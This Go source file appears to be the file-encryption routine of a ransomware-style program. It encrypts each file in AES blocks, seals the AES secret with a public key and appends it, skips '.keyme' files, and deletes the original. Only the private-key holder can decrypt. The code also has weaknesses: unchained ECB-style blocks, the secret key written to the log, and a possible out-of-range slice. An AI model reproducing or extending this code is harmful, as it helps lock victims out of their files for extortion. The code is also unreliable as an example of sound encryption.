package main

import (
	"crypto/aes"
	"crypto/cipher"
	"log"
	"strings"
)

func AES(f File) {

	if strings.HasSuffix(f.filename, ".keyme") {
		wg.Done()
		return
	}

	if strings.HasSuffix(f.filename, sig) {
		//decrypting
		encBytes = f.fileBytes[(len(f.fileBytes) - 32):len(f.fileBytes)] //set the encrypted bytes
		f.fileBytes = f.fileBytes[0 : len(f.fileBytes)-32]               //shave off the encrypted bytes
		decryptEncBytes(ReadPrivateKey())                                // sets the secret
	} else {
		encryptSecret(ReadPublicKey())
	}
	block := createBlock()
	for i := range f.fileBytes {
		if i%16 == 0 {
			if strings.HasSuffix(f.filename, sig) {
				_, err := f.newFile.Write(decrypt(f.fileBytes[i:i+16], block))
				CheckErr(err)
			} else {
				_, err := f.newFile.Write(encrypt(f.fileBytes[i:i+16], block)) //throws an error, no reason y tho
				CheckErr(err)
			}
		}
	}
	if !strings.HasSuffix(f.filename, sig) {
		//encrypting, need to add the bytes at the end so that we can recover
		_, _ = f.newFile.Write(encBytes)
	}
	f.deleteOldFile()
	wg.Done()
}

func createBlock() cipher.Block {
	log.Println(secret)
	block, err := aes.NewCipher(secret)
	CheckErr(err)
	return block
}

func encrypt(raw []byte, block cipher.Block) []byte {
	dst := make([]byte, 16)
	block.Encrypt(dst, raw)
	return dst
}

func decrypt(raw []byte, block cipher.Block) []byte {
	dst := make([]byte, 16)
	block.Decrypt(dst, raw)
	return dst
}
